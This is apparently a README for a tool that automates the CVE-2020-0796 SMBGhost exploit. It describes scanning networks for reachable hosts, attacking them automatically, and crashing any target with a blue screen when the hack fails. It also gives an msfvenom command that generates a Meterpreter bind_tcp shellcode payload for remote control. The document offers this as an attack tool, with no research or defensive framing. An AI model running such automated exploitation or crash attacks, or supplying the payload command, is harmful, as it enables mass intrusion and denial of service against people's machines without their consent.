CVE-2020-0796 SMBGhost exploit
# illustrate
	Add automation to the original code,
		automatically search for devices on the network for 443 or customize the scanning port for automatic hacking, 
			if it cannot be hacked, 
			it will perform a blue screen attack

The required dependency is the netaddr module, which only needs to be installed with pip
	python3 -m pip install netaddr
	or
	pip install netaddr

# remote trojan
If you need to generate remote payloads
	msfvenom -p windows/x64/meterpreter/bind_tcp lport=<PORT> -f python -o shellcode.txt


> This project is just a vulnerability modified into an automated script, the code is not completely written by myself.
